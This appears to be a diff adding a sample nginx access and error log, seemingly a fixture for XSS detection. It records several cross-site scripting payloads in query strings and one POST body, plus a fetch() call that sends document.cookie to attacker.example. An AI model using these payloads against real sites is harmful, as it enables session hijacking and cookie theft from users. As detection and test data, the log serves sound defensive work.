@@ -1,0 +1,15 @@
+# --- nginx access (combined) ---
+2025-11-01T15:02:11+05:30 203.0.113.45 - - "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+2025-11-01T15:02:13+05:30 203.0.113.45 - - "GET /profile?name=<img src=x onerror=alert('xss')> HTTP/1.1" 200 2048 "-" "curl/7.88.0"
+2025-11-01T15:05:27+05:30 198.51.100.12 - - "POST /comments HTTP/1.1" 302 148 "https://example.com/post/12" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+# POST body contained (logged separately by app): comment=<script>document.cookie</script>
+2025-11-01T15:07:02+05:30 198.51.100.12 - - "GET /?q=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1" 200 1024 "-" "python-requests/2.31.0"
+2025-11-01T15:10:44+05:30 192.0.2.68 - - "GET /search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1" 200 636 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X)"
+2025-11-01T15:15:01+05:30 203.0.113.45 - - "GET /cart?item_id=12%3Cscript%3Ealert('x')%3C%2Fscript%3E HTTP/1.1" 200 412 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-11-01T15:16:20+05:30 198.51.100.12 - - "GET /admin?lang=<script>while(1)</script> HTTP/1.1" 403 298 "-" "sqlmap/1.7.9#stable"
+2025-11-01T15:19:33+05:30 203.0.113.99 - - "GET /contact?message=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E HTTP/1.1" 200 724 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)"
+2025-11-01T15:21:09+05:30 203.0.113.99 - - "GET /product/53?ref=%3Cscript%3Efetch('http://attacker.example/steal?c='+document.cookie)%3C%2Fscript%3E HTTP/1.1" 200 998 "-" "Mozilla/5.0"
+
+# --- nginx error snippets (app reported) ---
+2025-11-01T15:05:27+05:30 [error] 12345#0: *502 FastCGI sent in stderr: "WARNING: Suspicious input detected in POST /comments: comment contains '<script>'" while reading response header from upstream, client: 198.51.100.12, server: example.com, request: "POST /comments HTTP/1.1", host: "example.com"
+2025-11-01T15:16:21+05:30 [warn] 12350#0: *523 Possible XSS attempt: encoded payload in querystring, client: 198.51.100.12, server: example.com, request: "GET /admin?lang=<script>while(1)</script> HTTP/1.1"
